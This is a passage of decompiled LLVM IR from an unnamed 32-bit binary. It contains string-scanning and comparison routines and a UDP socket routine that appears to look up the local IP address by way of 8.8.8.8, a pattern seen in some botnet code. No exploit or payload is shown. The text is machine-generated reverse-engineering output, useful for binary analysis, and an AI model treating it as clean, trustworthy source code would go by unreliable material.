bb53:                                             ; preds = %dec_label_pc_fb18
  br label %bb54

bb54:                                             ; preds = %dec_label_pc_fb18, %bb53
  %v0_fb2428 = phi i32 [ %v0_fb2429, %dec_label_pc_fb18 ], [ 0, %bb53 ]
  br i1 %v3_fb20, label %bb55, label %bb56

bb55:                                             ; preds = %bb54
  br label %bb56

bb56:                                             ; preds = %bb54, %bb55
  %v0_fb24 = phi i32 [ %v0_fb2428, %bb54 ], [ 1, %bb55 ]
  %tmp76 = icmp slt i32 %v1_fb24, 0
  %v4_fb24 = zext i1 %tmp76 to i32
  %v5_fb24 = or i32 %v0_fb24, %v4_fb24
  %v7_fb24 = icmp eq i32 %v5_fb24, 0
  br i1 %v7_fb24, label %dec_label_pc_fb2c, label %dec_label_pc_fb54

dec_label_pc_fb2c:                                ; preds = %bb56
  %v1_fb38 = load i32, i32* %r8.global-to-local, align 4
  %v2_fb38 = sub i32 %v3_fb48, %v1_fb38
  %v4_fb38 = xor i32 %v1_fb38, %v3_fb48
  %v5_fb38 = xor i32 %v2_fb38, %v3_fb48
  %v6_fb38 = and i32 %v5_fb38, %v4_fb38
  %v7_fb38 = icmp slt i32 %v6_fb38, 0
  %v8_fb38 = icmp slt i32 %v2_fb38, 0
  %v9_fb38 = icmp eq i32 %v3_fb48, %v1_fb38
  %v3_fb3c = xor i1 %v8_fb38, %v7_fb38
  %v4_fb3c = or i1 %v9_fb38, %v3_fb3c
  br i1 %v4_fb3c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_fb2c
  store i32 1, i32* @ip, align 4
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_fb2c
  store i32 1, i32* @ip, align 4
  br i1 %v2_fb40, label %.thread5, label %dec_label_pc_fb54

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_fb48 = mul i32 %v1_fb10, %v2_fb48.ph
  %v5_fb48 = add i32 %v4_fb48, %v3_fb48
  %v1_fb4c = load i32, i32* %r5.global-to-local, align 4
  %v2_fb4c = inttoptr i32 %v1_fb4c to i8*
  %v3_fb4c = load i8, i8* %v2_fb4c, align 1
  %v4_fb4c = zext i8 %v3_fb4c to i32
  %v6_fb4c = add i32 %v1_fb4c, 1
  store i32 %v6_fb4c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_facc.outer

dec_label_pc_fb54:                                ; preds = %thread-pre-split, %bb56
  %v0_fb54 = load i32, i32* %r5.global-to-local, align 4
  %v1_fb54 = inttoptr i32 %v0_fb54 to i8*
  %v2_fb54 = load i8, i8* %v1_fb54, align 1
  %v3_fb54 = zext i8 %v2_fb54 to i32
  %v5_fb54 = add i32 %v0_fb54, 1
  store i32 %v5_fb54, i32* %r5.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_facc

dec_label_pc_fb60:                                ; preds = %dec_label_pc_fb10, %bb50
  %v1_fb60 = icmp slt i32 %v1_fb24, 0
  %v0_fb8c = load i32, i32* %sl.global-to-local, align 4
  %v2_fb8c = icmp eq i32 %v0_fb8c, 0
  br i1 %v1_fb60, label %dec_label_pc_fb8c, label %dec_label_pc_fb68

dec_label_pc_fb68:                                ; preds = %dec_label_pc_fb60
  br i1 %v2_fb8c, label %bb60, label %bb59

bb59:                                             ; preds = %dec_label_pc_fb68
  %v2_fb6c = sub i32 0, %v2_fb48.ph
  br label %bb60

bb60:                                             ; preds = %.thread32, %bb61, %dec_label_pc_fb68, %bb59
  %v1_fb78 = phi i32 [ -2147483648, %bb61 ], [ %v2_fb48.ph, %dec_label_pc_fb68 ], [ %v2_fb6c, %bb59 ], [ 2147483647, %.thread32 ]
  store i32 %v3_fa60, i32* @r4, align 4
  store i32 %v12_fa60, i32* @r7, align 4
  ret i32 %v1_fb78

dec_label_pc_fb7c:                                ; preds = %dec_label_pc_fa8c
  %v1_fb7c = inttoptr i32 %v5_fa70 to i8*
  %v2_fb7c = load i8, i8* %v1_fb7c, align 1
  %v3_fb7c = zext i8 %v2_fb7c to i32
  store i32 %v3_fb7c, i32* @r4, align 4
  %v5_fb7c = add i32 %v0_fa70, 2
  store i32 %v5_fb7c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_faa4

dec_label_pc_fb8c:                                ; preds = %dec_label_pc_fb60
  br i1 %v2_fb8c, label %.thread32, label %bb61

.thread32:                                        ; preds = %dec_label_pc_fb8c
  br label %bb60

bb61:                                             ; preds = %dec_label_pc_fb8c
  br label %bb60

; uselistorder directives
  uselistorder i1 %v2_fb8c, { 1, 0 }
  uselistorder i32 %v2_fb38, { 1, 0 }
  uselistorder i32 %v1_fb38, { 1, 0, 2 }
  uselistorder i32 %v2_fb10, { 1, 0 }
  uselistorder i32 %v3_fb48, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_fae8, { 1, 2, 0 }
  uselistorder i1 %v2_fae8, { 1, 0, 2 }
  uselistorder i32 %v1_facc, { 1, 2, 0 }
  uselistorder i32 %v1_fb0c, { 1, 2, 0 }
  uselistorder i32 %v1_fb24, { 1, 0 }
  uselistorder i1 %v9_fb18, { 1, 0, 2 }
  uselistorder i1 %v3_fb18, { 1, 0 }
  uselistorder i32 %v2_fb48.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_fabc, { 1, 0 }
  uselistorder i32 %v5_fa70, { 3, 4, 5, 2, 1, 0 }
  uselistorder i8 %v2_fa70, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_fa70, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 5, 2, 4, 3, 6, 7 }
  uselistorder i32 25, { 11, 12, 1, 6, 2, 7, 0, 8, 3, 4, 9, 5, 10, 13 }
  uselistorder i8 32, { 7, 8, 9, 0, 10, 11, 1, 2, 3, 4, 5, 6, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i8 9, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %bb60, { 1, 0, 3, 2 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %dec_label_pc_fb10, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_facc, { 1, 0 }
  uselistorder label %dec_label_pc_faa4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fa70, { 1, 2, 0, 3 }
}

define i32 @function_fb9c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fb9c:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_fb9c = load i32, i32* @r4, align 4
  store i32 %v3_fb9c, i32* %stack_var_-24, align 4
  %v12_fb9c = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_fbb4

dec_label_pc_fbb4:                                ; preds = %dec_label_pc_fbd8.dec_label_pc_fbb4_crit_edge, %dec_label_pc_fb9c
  %v0_fbb8 = phi i32 [ %v0_fbb8.pre, %dec_label_pc_fbd8.dec_label_pc_fbb4_crit_edge ], [ %arg3, %dec_label_pc_fb9c ]
  %v1_fbc0 = call i32 @function_103a0(i32 %v0_fbb8)
  %v7_fbc4 = icmp eq i32 %v1_fbc0, 1
  %v0_fbcc = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_fbc4, label %dec_label_pc_fbcc, label %dec_label_pc_fbe4

dec_label_pc_fbcc:                                ; preds = %dec_label_pc_fbb4
  %v1_fbcc = add i32 %v0_fbcc, 1
  store i32 %v1_fbcc, i32* %r5.global-to-local, align 4
  %v1_fbd0 = load i32, i32* %r8.global-to-local, align 4
  %v6_fbd4 = icmp slt i32 %v1_fbcc, %v1_fbd0
  br i1 %v6_fbd4, label %dec_label_pc_fbd8, label %.loopexit

dec_label_pc_fbd8:                                ; preds = %dec_label_pc_fbcc
  %v0_fbd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_fbd8 = inttoptr i32 %v0_fbd8 to i8*
  %v2_fbd8 = load i8, i8* %v1_fbd8, align 1
  %v5_fbd8 = add i32 %v0_fbd8, 1
  store i32 %v5_fbd8, i32* %r4.global-to-local, align 4
  %v7_fbdc = icmp eq i8 %v2_fbd8, 10
  br i1 %v7_fbdc, label %dec_label_pc_fbe4, label %dec_label_pc_fbd8.dec_label_pc_fbb4_crit_edge

dec_label_pc_fbd8.dec_label_pc_fbb4_crit_edge:    ; preds = %dec_label_pc_fbd8
  %v0_fbb8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_fbb4

dec_label_pc_fbe4:                                ; preds = %dec_label_pc_fbb4, %dec_label_pc_fbd8
  %v0_fbe4 = phi i32 [ %v1_fbcc, %dec_label_pc_fbd8 ], [ %v0_fbcc, %dec_label_pc_fbb4 ]
  %v2_fbe4 = icmp eq i32 %v0_fbe4, 0
  br i1 %v2_fbe4, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_fbe4
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_fbcc, %dec_label_pc_fbe4, %bb
  %v0_fbec = load i32, i32* @r7, align 4
  %v2_fbf0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_fbf0, i32* @r4, align 4
  store i32 %v12_fb9c, i32* @r7, align 4
  ret i32 %v0_fbec

; uselistorder directives
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fbe4, { 1, 0 }
}

define i32 @function_fbf8(i32 %arg1) local_unnamed_addr {
dec_label_pc_fbf8:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 16, i32* %r6.global-to-local, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_fc08 = call i32 @function_10a30()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_fc10 = inttoptr i32 %v0_fc08 to i32*
  store i32 0, i32* %v2_fc10, align 4
  %v0_fc1c = load i32, i32* %r4.global-to-local, align 4
  %v3_fc20 = call i32 @function_10df0(i32 2, i32 2, i32 %v0_fc1c)
  %v7_fc24 = icmp eq i32 %v3_fc20, -1
  store i32 %v3_fc20, i32* %r5.global-to-local, align 4
  br i1 %v7_fc24, label %bb, label %dec_label_pc_fc34

bb:                                               ; preds = %dec_label_pc_fbf8
  %v1_fc2c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fc80

dec_label_pc_fc34:                                ; preds = %dec_label_pc_fbf8
  %v2_fc40 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_fc40, i32* %r4.global-to-local, align 4
  %v0_fc4c = load i32, i32* %r6.global-to-local, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_fc60 = call i32 @function_10bd8(i32 %v3_fc20, i32 %v2_fc40, i32 %v0_fc4c)
  %v2_fc68 = ptrtoint i32* %stack_var_-20 to i32
  %v0_fc6c = load i32, i32* %r5.global-to-local, align 4
  %v3_fc70 = call i32 @function_10c10(i32 %v0_fc6c, i32 %v2_fc40, i32 %v2_fc68)
  %v1_fc78 = call i32 @function_10608(i32 %v0_fc6c)
  br label %dec_label_pc_fc80

dec_label_pc_fc80:                                ; preds = %bb, %dec_label_pc_fc34
  %storemerge = phi i32 [ 134744072, %dec_label_pc_fc34 ], [ %v1_fc2c, %bb ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_fc20, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10bd8, { 6, 4, 5, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10df0, { 14, 12, 13, 11, 10, 1, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder label %dec_label_pc_fc80, { 1, 0 }
}

define i32 @function_fc8c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fc8c:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_fc90 = load i8, i8* %tmp, align 1
  %v2_fc94 = icmp eq i8 %v3_fc90, 0
  br i1 %v2_fc94, label %bb, label %dec_label_pc_fca8

bb:                                               ; preds = %dec_label_pc_fc8c
  %v4_fc90 = zext i8 %v3_fc90 to i32
  br label %dec_label_pc_fcbc

dec_label_pc_fca8:                                ; preds = %dec_label_pc_fc8c
  br label %dec_label_pc_fcac

dec_label_pc_fcac:                                ; preds = %dec_label_pc_fcac, %dec_label_pc_fca8
  %v0_fcac = phi i32 [ %v1_fcac, %dec_label_pc_fcac ], [ 0, %dec_label_pc_fca8 ]
  %v1_fcac = add i32 %v0_fcac, 1
  %v2_fcb0 = add i32 %v1_fcac, %arg2
  %v3_fcb0 = inttoptr i32 %v2_fcb0 to i8*
  %v4_fcb0 = load i8, i8* %v3_fcb0, align 1
  %v2_fcb4 = icmp eq i8 %v4_fcb0, 0
  br i1 %v2_fcb4, label %dec_label_pc_fcbc, label %dec_label_pc_fcac

dec_label_pc_fcbc:                                ; preds = %dec_label_pc_fcac, %bb
  %v0_fd0021 = phi i32 [ %v4_fc90, %bb ], [ %v1_fcac, %dec_label_pc_fcac ]
  %v0_fcc42 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_fcc42, 1
  br i1 %tmp29, label %dec_label_pc_fd14, label %dec_label_pc_fcd0

dec_label_pc_fcd0:                                ; preds = %dec_label_pc_fcbc, %dec_label_pc_fcc4.backedge
  %v0_fcc8.in = phi i32 [ %v0_fcc8, %dec_label_pc_fcc4.backedge ], [ %v0_fcc42, %dec_label_pc_fcbc ]
  %v1_fcdc = phi i32 [ %v1_fcdc15, %dec_label_pc_fcc4.backedge ], [ 0, %dec_label_pc_fcbc ]
  %v0_fcd0 = phi i32 [ %v5_fcd0, %dec_label_pc_fcc4.backedge ], [ %tmp23, %dec_label_pc_fcbc ]
  %v0_fcc8 = add i32 %v0_fcc8.in, -1
  %v1_fcd0 = inttoptr i32 %v0_fcd0 to i8*
  %v2_fcd0 = load i8, i8* %v1_fcd0, align 1
  %v3_fcd0 = zext i8 %v2_fcd0 to i32
  store i32 %v3_fcd0, i32* @ip, align 4
  %v5_fcd0 = add i32 %v0_fcd0, 1
  %v1_fcd4 = add nsw i32 %v3_fcd0, -65
  %v2_fcdc = add i32 %v1_fcdc, %arg2
  %v3_fcdc = inttoptr i32 %v2_fcdc to i8*
  %v4_fcdc = load i8, i8* %v3_fcdc, align 1
  %v6_fcdc = zext i8 %v4_fcdc to i32
  %v1_fce0 = add nsw i32 %v6_fcdc, -65
  %tmp38 = icmp ult i32 %v1_fcd4, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_fcd0
  %v5_fce4 = or i32 %v3_fcd0, 96
  store i32 %v5_fce4, i32* @ip, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_fcd0, %bb30
  %v0_fcf0 = phi i32 [ %v3_fcd0, %dec_label_pc_fcd0 ], [ %v5_fce4, %bb30 ]
  %tmp39 = icmp ult i32 %v1_fce0, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_fcec = or i32 %v6_fcdc, 96
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_fcf0 = phi i32 [ %v6_fcdc, %bb31 ], [ %v5_fcec, %bb32 ]
  %v9_fcf0 = icmp eq i32 %v0_fcf0, %v1_fcf0
  br i1 %v9_fcf0, label %dec_label_pc_fcfc, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_fcc4.backedge

dec_label_pc_fcc4.backedge:                       ; preds = %bb34, %dec_label_pc_fcfc
  %v1_fcdc15 = phi i32 [ 0, %bb34 ], [ %v1_fcfc, %dec_label_pc_fcfc ]
  %tmp35 = icmp slt i32 %v0_fcc8, 1
  br i1 %tmp35, label %dec_label_pc_fd14, label %dec_label_pc_fcd0

dec_label_pc_fcfc:                                ; preds = %bb33
  %v1_fcfc = add i32 %v1_fcdc, 1
  %v9_fd00 = icmp eq i32 %v0_fd0021, %v1_fcfc
  br i1 %v9_fd00, label %dec_label_pc_fd08, label %dec_label_pc_fcc4.backedge

dec_label_pc_fd08:                                ; preds = %dec_label_pc_fcfc
  %v2_fd08 = sub i32 %v5_fcd0, %tmp23
  br label %dec_label_pc_fd14

dec_label_pc_fd14:                                ; preds = %dec_label_pc_fcc4.backedge, %dec_label_pc_fcbc, %dec_label_pc_fd08
  %storemerge = phi i32 [ %v2_fd08, %dec_label_pc_fd08 ], [ -1, %dec_label_pc_fcbc ], [ -1, %dec_label_pc_fcc4.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_fcfc, { 1, 0 }
  uselistorder i32 %v0_fcd0, { 1, 0 }
  uselistorder i32 %v1_fcdc, { 1, 0 }
  uselistorder i8 %v3_fc90, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder label %dec_label_pc_fd14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fcc4.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_fcd0, { 1, 0 }
}

define i32 @function_fd1c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fd1c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_fd1c = load i8, i8* %arg1, align 1
  %v2_fd20 = icmp eq i8 %v2_fd1c, 0
  br i1 %v2_fd20, label %bb, label %dec_label_pc_fd2c

bb:                                               ; preds = %dec_label_pc_fd1c
  %v3_fd1c = zext i8 %v2_fd1c to i32
  br label %dec_label_pc_fd40

dec_label_pc_fd2c:                                ; preds = %dec_label_pc_fd1c
  br label %dec_label_pc_fd30

dec_label_pc_fd30:                                ; preds = %dec_label_pc_fd30, %dec_label_pc_fd2c
  %v0_fd30 = phi i32 [ %v1_fd30, %dec_label_pc_fd30 ], [ 0, %dec_label_pc_fd2c ]
  %v1_fd30 = add i32 %v0_fd30, 1
  %v2_fd34 = add i32 %v1_fd30, %tmp
  %v3_fd34 = inttoptr i32 %v2_fd34 to i8*
  %v4_fd34 = load i8, i8* %v3_fd34, align 1
  %v2_fd38 = icmp eq i8 %v4_fd34, 0
  br i1 %v2_fd38, label %dec_label_pc_fd40, label %dec_label_pc_fd30

dec_label_pc_fd40:                                ; preds = %dec_label_pc_fd30, %bb
  %v0_fd8c3 = phi i32 [ %v3_fd1c, %bb ], [ %v1_fd30, %dec_label_pc_fd30 ]
  %v1_fd40 = inttoptr i32 %arg2 to i8*
  %v2_fd40 = load i8, i8* %v1_fd40, align 1
  %v3_fd40 = zext i8 %v2_fd40 to i32
  store i32 %v3_fd40, i32* @r3, align 4
  %v2_fd44 = icmp eq i8 %v2_fd40, 0
  br i1 %v2_fd44, label %bb21, label %dec_label_pc_fd50

bb21:                                             ; preds = %dec_label_pc_fd40
  store i32 %v3_fd40, i32* @r2, align 4
  br label %dec_label_pc_fd64

dec_label_pc_fd50:                                ; preds = %dec_label_pc_fd40
  br label %dec_label_pc_fd54

dec_label_pc_fd54:                                ; preds = %dec_label_pc_fd54, %dec_label_pc_fd50
  %v0_fd54 = phi i32 [ %v1_fd54, %dec_label_pc_fd54 ], [ 0, %dec_label_pc_fd50 ]
  %v1_fd54 = add i32 %v0_fd54, 1
  store i32 %v1_fd54, i32* @r2, align 4
  %v2_fd58 = add i32 %v1_fd54, %arg2
  %v3_fd58 = inttoptr i32 %v2_fd58 to i8*
  %v4_fd58 = load i8, i8* %v3_fd58, align 1
  %v6_fd58 = zext i8 %v4_fd58 to i32
  store i32 %v6_fd58, i32* @r3, align 4
  %v2_fd5c = icmp eq i8 %v4_fd58, 0
  br i1 %v2_fd5c, label %dec_label_pc_fd64, label %dec_label_pc_fd54

dec_label_pc_fd64:                                ; preds = %dec_label_pc_fd54, %bb21
  %v1_fd64 = phi i32 [ %v3_fd40, %bb21 ], [ %v1_fd54, %dec_label_pc_fd54 ]
  %v9_fd64 = icmp eq i32 %v0_fd8c3, %v1_fd64
  br i1 %v9_fd64, label %dec_label_pc_fd8c.preheader, label %dec_label_pc_fd6c

dec_label_pc_fd8c.preheader:                      ; preds = %dec_label_pc_fd64
  %v2_fd8c5 = icmp eq i32 %v0_fd8c3, 0
  br i1 %v2_fd8c5, label %dec_label_pc_fd94, label %dec_label_pc_fd74

dec_label_pc_fd6c:                                ; preds = %dec_label_pc_fd74, %dec_label_pc_fd64
  ret i32 0

dec_label_pc_fd74:                                ; preds = %dec_label_pc_fd84, %dec_label_pc_fd8c.preheader
  %v0_fd8c.in = phi i32 [ %v0_fd8c, %dec_label_pc_fd84 ], [ %v0_fd8c3, %dec_label_pc_fd8c.preheader ]
  %v0_fd88 = phi i32 [ %v1_fd88, %dec_label_pc_fd84 ], [ %arg2, %dec_label_pc_fd8c.preheader ]
  %v0_fd84 = phi i32 [ %v1_fd84, %dec_label_pc_fd84 ], [ %tmp, %dec_label_pc_fd8c.preheader ]
  %v0_fd8c = add i32 %v0_fd8c.in, -1
  %v1_fd74 = inttoptr i32 %v0_fd84 to i8*
  %v2_fd74 = load i8, i8* %v1_fd74, align 1
  %v3_fd74 = zext i8 %v2_fd74 to i32
  store i32 %v3_fd74, i32* @r2, align 4
  %v1_fd78 = inttoptr i32 %v0_fd88 to i8*
  %v2_fd78 = load i8, i8* %v1_fd78, align 1
  %v3_fd78 = zext i8 %v2_fd78 to i32
  store i32 %v3_fd78, i32* @r3, align 4
  %v9_fd7c = icmp eq i8 %v2_fd74, %v2_fd78
  br i1 %v9_fd7c, label %dec_label_pc_fd84, label %dec_label_pc_fd6c

dec_label_pc_fd84:                                ; preds = %dec_label_pc_fd74
  %v1_fd84 = add i32 %v0_fd84, 1
  %v1_fd88 = add i32 %v0_fd88, 1
  %v2_fd8c = icmp eq i32 %v0_fd8c, 0
  br i1 %v2_fd8c, label %dec_label_pc_fd94, label %dec_label_pc_fd74

dec_label_pc_fd94:                                ; preds = %dec_label_pc_fd84, %dec_label_pc_fd8c.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_fd54, { 0, 1, 3, 2 }
  uselistorder i8 %v2_fd1c, { 1, 0 }
}

define i32 @function_fd9c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fd9c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_fda0 = load i8, i8* %arg1, align 1
  %v2_fda4 = icmp eq i8 %v2_fda0, 0
  %v0_fda8 = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_fda4, label %bb, label %dec_label_pc_fdb4

bb:                                               ; preds = %dec_label_pc_fd9c
  %v3_fda0 = zext i8 %v2_fda0 to i32
  br label %dec_label_pc_fdc8

dec_label_pc_fdb4:                                ; preds = %dec_label_pc_fd9c
  br label %dec_label_pc_fdb8

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fdb8, %dec_label_pc_fdb4
  %v0_fdb8 = phi i32 [ %v1_fdb8, %dec_label_pc_fdb8 ], [ 0, %dec_label_pc_fdb4 ]
  %v1_fdb8 = add i32 %v0_fdb8, 1
  %v2_fdbc = add i32 %v1_fdb8, %tmp
  %v3_fdbc = inttoptr i32 %v2_fdbc to i8*
  %v4_fdbc = load i8, i8* %v3_fdbc, align 1
  %v2_fdc0 = icmp eq i8 %v4_fdbc, 0
  br i1 %v2_fdc0, label %dec_label_pc_fdc8, label %dec_label_pc_fdb8

dec_label_pc_fdc8:                                ; preds = %dec_label_pc_fdb8, %bb
  %v6_fdf0 = phi i32 [ %v3_fda0, %bb ], [ %v1_fdb8, %dec_label_pc_fdb8 ]
  %v0_fdc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_fdc8 = inttoptr i32 %v0_fdc8 to i8*
  %v2_fdc8 = load i8, i8* %v1_fdc8, align 1
  %v3_fdc8 = zext i8 %v2_fdc8 to i32
  %v2_fdcc = icmp eq i8 %v2_fdc8, 0
  br i1 %v2_fdcc, label %bb26, label %dec_label_pc_fdd8

bb26:                                             ; preds = %dec_label_pc_fdc8
  store i32 %v3_fdc8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fdec

dec_label_pc_fdd8:                                ; preds = %dec_label_pc_fdc8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fddc

dec_label_pc_fddc:                                ; preds = %dec_label_pc_fddc, %dec_label_pc_fdd8
  %v0_fddc = phi i32 [ %v1_fddc, %dec_label_pc_fddc ], [ 0, %dec_label_pc_fdd8 ]
  %v1_fddc = add i32 %v0_fddc, 1
  store i32 %v1_fddc, i32* %r2.global-to-local, align 4
  %v2_fde0 = add i32 %v1_fddc, %v0_fdc8
  %v3_fde0 = inttoptr i32 %v2_fde0 to i8*
  %v4_fde0 = load i8, i8* %v3_fde0, align 1
  %v2_fde4 = icmp eq i8 %v4_fde0, 0
  br i1 %v2_fde4, label %dec_label_pc_fdec, label %dec_label_pc_fddc

dec_label_pc_fdec:                                ; preds = %dec_label_pc_fddc, %bb26
  %v0_fdec = phi i32 [ %v3_fdc8, %bb26 ], [ %v1_fddc, %dec_label_pc_fddc ]
  %v2_fdec = sub i32 %v0_fdec, %v0_fda8
  %v4_fdec = xor i32 %v0_fdec, %v0_fda8
  %v5_fdec = xor i32 %v2_fdec, %v0_fdec
  %v6_fdec = and i32 %v5_fdec, %v4_fdec
  %v5_fdf0 = icmp slt i32 %v0_fdec, %v0_fda8
  br i1 %v5_fdf0, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_fdec
  %v8_fdf0 = sub i32 %v6_fdf0, %v0_fda8
  %v10_fdf0 = xor i32 %v6_fdf0, %v0_fda8
  %v11_fdf0 = xor i32 %v8_fdf0, %v6_fdf0
  %v12_fdf0 = and i32 %v11_fdf0, %v10_fdf0
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_fdec, %bb27
  %v1_fdf4.in = phi i32 [ %v6_fdec, %dec_label_pc_fdec ], [ %v12_fdf0, %bb27 ]
  %v0_fdf4.in = phi i32 [ %v2_fdec, %dec_label_pc_fdec ], [ %v8_fdf0, %bb27 ]
  %v0_fdf4 = icmp slt i32 %v0_fdf4.in, 0
  %v1_fdf4 = icmp slt i32 %v1_fdf4.in, 0
  %v2_fdf4 = xor i1 %v1_fdf4, %v0_fdf4
  br i1 %v2_fdf4, label %dec_label_pc_fe20, label %dec_label_pc_fe04.preheader

dec_label_pc_fe04.preheader:                      ; preds = %bb28
  %v2_fe045 = icmp eq i32 %v0_fda8, 0
  br i1 %v2_fe045, label %dec_label_pc_fe20, label %dec_label_pc_fe0c

dec_label_pc_fdfc:                                ; preds = %dec_label_pc_fe0c
  %v1_fdfc = add i32 %v0_fdfc, 1
  %v1_fe00 = add i32 %v0_fe00, 1
  store i32 %v1_fe00, i32* %r1.global-to-local, align 4
  %v2_fe04 = icmp eq i32 %v0_fe04, 0
  br i1 %v2_fe04, label %dec_label_pc_fe20, label %dec_label_pc_fe0c

dec_label_pc_fe0c:                                ; preds = %dec_label_pc_fdfc, %dec_label_pc_fe04.preheader
  %v0_fe04.in = phi i32 [ %v0_fe04, %dec_label_pc_fdfc ], [ %v0_fda8, %dec_label_pc_fe04.preheader ]
  %v0_fe00 = phi i32 [ %v1_fe00, %dec_label_pc_fdfc ], [ %v0_fdc8, %dec_label_pc_fe04.preheader ]
  %v0_fdfc = phi i32 [ %v1_fdfc, %dec_label_pc_fdfc ], [ %tmp, %dec_label_pc_fe04.preheader ]
  %v0_fe04 = add i32 %v0_fe04.in, -1
  %v1_fe0c = inttoptr i32 %v0_fdfc to i8*
  %v2_fe0c = load i8, i8* %v1_fe0c, align 1
  %v3_fe0c = zext i8 %v2_fe0c to i32
  store i32 %v3_fe0c, i32* %r2.global-to-local, align 4
  %v1_fe10 = inttoptr i32 %v0_fe00 to i8*
  %v2_fe10 = load i8, i8* %v1_fe10, align 1
  %v9_fe14 = icmp eq i8 %v2_fe0c, %v2_fe10
  br i1 %v9_fe14, label %dec_label_pc_fdfc, label %dec_label_pc_fe20

dec_label_pc_fe20:                                ; preds = %dec_label_pc_fdfc, %dec_label_pc_fe04.preheader, %dec_label_pc_fe0c, %bb28
  %storemerge = phi i32 [ 0, %bb28 ], [ 1, %dec_label_pc_fe04.preheader ], [ 1, %dec_label_pc_fdfc ], [ 0, %dec_label_pc_fe0c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_fdfc, { 1, 0 }
  uselistorder i32 %v0_fe00, { 1, 0 }
  uselistorder i32 %v0_fdec, { 3, 0, 1, 2 }
  uselistorder i32 %v1_fddc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_fda8, { 0, 3, 1, 4, 6, 2, 5 }
  uselistorder i8 %v2_fda0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
